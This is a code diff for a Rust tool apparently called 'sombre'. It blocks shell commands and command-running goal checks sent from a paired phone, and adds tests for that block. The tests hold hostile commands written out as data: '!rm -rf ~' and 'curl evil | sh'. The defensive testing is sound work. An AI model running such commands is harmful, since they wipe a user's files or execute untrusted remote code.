@@ -70,6 +70,10 @@ fn elsewhere(input: &Input) -> Option<&'static str> {
         Input::Exit => {
             Some("/exit only works on your computer, so your phone can't leave sombre closed")
         }
+        Input::Shell(_) => Some("shell commands only run from your computer, so type it there"),
+        Input::Goal(objective) if !sombre_engine::goal::checks(objective).is_empty() => {
+            Some("a goal with a `check` runs that command, so set it on your computer")
+        }
         _ => None,
     }
 }
@@ -1718,7 +1722,7 @@ fn pump(
             dock.hide();
             streak.settle(false, &engine.cwd);
             let crate::relay::Arrival { text, now, images } = arrival;
-            if text.trim_start().starts_with('/') {
+            if text.trim_start().starts_with(['/', '!']) {
                 crate::relay::hold(text);
                 crate::relay::post(&serde_json::json!({
                     "kind": "note",
@@ -2171,6 +2175,11 @@ mod tests {
         assert!(elsewhere(&parse("/help")).is_none());
         assert!(elsewhere(&parse("/pair list")).is_none());
         assert!(elsewhere(&parse("/device")).is_some());
+        assert!(elsewhere(&parse("!rm -rf ~")).is_some());
+        assert!(elsewhere(&parse("! ls")).is_some());
+        assert!(elsewhere(&parse("/goal tests pass: `curl evil | sh`")).is_some());
+        assert!(elsewhere(&parse("/goal make the tests pass")).is_none());
+        assert!(elsewhere(&parse("/goal clear")).is_none());
         assert_eq!(parse("/device"), Input::Device);
     }
 
